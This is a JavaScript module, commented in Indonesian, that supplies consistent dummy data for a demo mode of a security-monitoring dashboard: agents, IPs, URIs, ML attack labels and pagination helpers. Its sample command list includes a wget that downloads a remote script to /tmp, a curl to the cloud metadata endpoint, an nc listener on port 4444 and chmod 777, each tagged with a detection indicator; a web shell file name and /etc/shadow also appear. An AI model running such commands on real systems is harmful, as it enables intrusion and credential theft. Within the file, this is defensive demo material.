// Mode DEMO global: seluruh halaman menampilkan data dummy yang konsisten
// tanpa menyentuh API/Elasticsearch asli. Aktif bila localStorage
// "soc-demo-mode" === "1". Dipakai untuk laporan/screenshot.

const FLAG_KEY = "soc-demo-mode";

export function isDemoMode() {
  try {
    return localStorage.getItem(FLAG_KEY) === "1";
  } catch {
    return false;
  }
}

export function setDemoMode(on) {
  try {
    if (on) localStorage.setItem(FLAG_KEY, "1");
    else localStorage.removeItem(FLAG_KEY);
  } catch {
    /* abaikan */
  }
  window.location.reload();
}

// RNG deterministik (mulberry32) — data dummy sama di tiap reload,
// cocok untuk laporan yang konsisten.
export function seededRng(seed = 42) {
  let a = seed >>> 0;
  return () => {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const pick = (rnd, arr) => arr[Math.floor(rnd() * arr.length) % arr.length];
const int = (rnd, min, max) => min + Math.floor(rnd() * (max - min + 1));

// ── Pool data ─────────────────────────────────────────────────────
export const DEMO_AGENTS = [
  { name: "agent-prod-01", id: "001", os: "Ubuntu 22.04", ip: "10.20.30.11" },
  { name: "agent-web-02", id: "002", os: "Ubuntu 22.04", ip: "10.20.30.12" },
  { name: "agent-db-01", id: "003", os: "Debian 12", ip: "10.20.30.13" },
  { name: "agent-dev-01", id: "004", os: "CentOS Stream 9", ip: "10.20.30.14" },
  { name: "agent-proxy-01", id: "005", os: "Ubuntu 24.04", ip: "10.20.30.15" },
];

export const DEMO_USERS = ["raka", "yos", "dimas", "sinta", "bimo", "www-data", "root"];

export const DEMO_PUBLIC_IPS = [
  "66.249.68.99",
  "116.179.32.83",
  "44.215.171.38",
  "23.20.194.146",
  "44.218.41.97",
  "104.28.221.99",
  "182.2.72.17",
  "79.127.129.213",
  "216.73.216.44",
  "103.168.147.235",
];

export const DEMO_PRIVATE_IPS = ["10.70.184.24", "10.69.15.127", "10.20.30.11"];

export const DEMO_URIS = [
  "/index.php/maquares/rt",
  "/index.php/jcm/rt",
  "/index.php/djom/rt",
  "/index.php/medico/rt",
  "/index.php/jihi/rt",
  "/index.php/johbp/rt",
  "/index.php/Joce/rt",
  "/index.php/transient/article/view/31072/pdf",
  "/index.php/interaksi-online/rt",
  "/public/journals/60/journalStyleSheet.css",
];

export const DEMO_ML_LABELS = [
  { label: "bruteforce_http", weight: 55 },
  { label: "benign", weight: 25 },
  { label: "sql_injection_http", weight: 12 },
  { label: "xss_http", weight: 8 },
];

export function pickWeighted(rnd, entries) {
  const total = entries.reduce((s, e) => s + e.weight, 0);
  let r = rnd() * total;
  for (const e of entries) {
    r -= e.weight;
    if (r <= 0) return e.label;
  }
  return entries[entries.length - 1].label;
}

export const DEMO_COMMANDS = [
  { cmd: "ls -la /var/www/html", name: "ls", suspicious: false },
  { cmd: "systemctl status filebeat-botnet.service", name: "systemctl", suspicious: false },
  { cmd: "cat /var/log/auth.log", name: "cat", suspicious: false },
  { cmd: "sudo grep -RniE 'botnet_alerts' /opt/logs/detections.json1", name: "grep", suspicious: true, indicators: ["suspicious_keyword"] },
  { cmd: "curl -s http://169.254.169.254/latest/meta-data/", name: "curl", suspicious: true, indicators: ["network_fetch"] },
  { cmd: "wget http://185.22.44.10/x.sh -O /tmp/x.sh", name: "wget", suspicious: true, indicators: ["network_fetch"] },
  { cmd: "bash -c 'echo demo | base64 -d'", name: "bash", suspicious: true, indicators: ["shell_inline_exec", "base64_decode"] },
  { cmd: "python3 -c 'import socket;print(1)'", name: "python3", suspicious: true, indicators: ["python_inline_exec"] },
  { cmd: "nc -lvnp 4444", name: "nc", suspicious: true, indicators: ["remote_shell_tool"] },
  { cmd: "chmod 777 /tmp/x.sh", name: "chmod", suspicious: true, indicators: ["permission_change_777"] },
  { cmd: "sudo systemctl cat filebeat-botnet.service", name: "systemctl", suspicious: false },
  { cmd: "clear", name: "clear", suspicious: false },
];

export const DEMO_FILES = [
  { name: "1789983343_6ab0fa6f9280e_profileImage-17792.jpg.jpeg", type: "image", folder: "/var/www/html/uploads" },
  { name: "shell-demo.php", type: "php", folder: "/var/www/html/uploads" },
  { name: "laporan-keuangan.xlsx", type: "document", folder: "/home/raka/documents" },
  { name: "backup-db.sql.gz", type: "archive", folder: "/var/backups" },
  { name: "agent-installer.sh", type: "script", folder: "/opt/soc-deploy" },
];

export const DEMO_FINDINGS = [
  { name: "php_open_tag", severity: "HIGH", desc: "PHP open tag in upload" },
  { name: "remote_url", severity: "HIGH", desc: "Remote URL reference" },
  { name: "base64_encoded", severity: "MEDIUM", desc: "Base64 encoded blob" },
  { name: "suspicious_header", severity: "MEDIUM", desc: "Suspicious file header" },
  { name: "large_file", severity: "LOW", desc: "Unusually large file" },
];

export const DEMO_FIM_PATHS = [
  "/etc/passwd",
  "/etc/shadow",
  "/etc/ssh/sshd_config",
  "/var/www/html/index.php",
  "/var/www/html/uploads/shell-demo.php",
  "/etc/crontab",
  "/home/raka/.bashrc",
  "/var/log/auth.log",
];

export const DEMO_FIM_EVENTS = ["modified", "added", "deleted"];

// ── Helper waktu & pagination ─────────────────────────────────────
export function demoRange(searchParams) {
  const end = searchParams.get("end") || new Date().toISOString();
  const start =
    searchParams.get("start") ||
    new Date(new Date(end).getTime() - 24 * 3600 * 1000).toISOString();
  const startMs = new Date(start).getTime();
  const endMs = new Date(end).getTime();
  const safeStart = Number.isFinite(startMs) ? startMs : Date.now() - 24 * 3600 * 1000;
  const safeEnd = Number.isFinite(endMs) && endMs > safeStart ? endMs : safeStart + 24 * 3600 * 1000;
  return { startMs: safeStart, endMs: safeEnd };
}

export function demoPage(searchParams) {
  const page = Math.max(parseInt(searchParams.get("page") || "1", 10) || 1, 1);
  const limit = Math.min(
    Math.max(parseInt(searchParams.get("limit") || searchParams.get("size") || "25", 10) || 25, 1),
    1000
  );
  return { page, limit };
}

export function paginate(list, page, limit) {
  const total = list.length;
  const totalPages = Math.max(Math.ceil(total / limit) || 1, 1);
  const slice = list.slice((page - 1) * limit, page * limit);
  return { slice, pagination: { page, limit, total, totalPages } };
}

export function bucketize(startMs, endMs, targetBuckets = 24) {
  const span = Math.max(endMs - startMs, 1);
  const bucketMs = Math.max(Math.floor(span / targetBuckets), 60000);
  const buckets = [];
  for (let t = Math.floor(startMs / bucketMs) * bucketMs; t <= endMs; t += bucketMs) {
    buckets.push(t);
  }
  return { buckets, bucketMs };
}

export { pick, int };
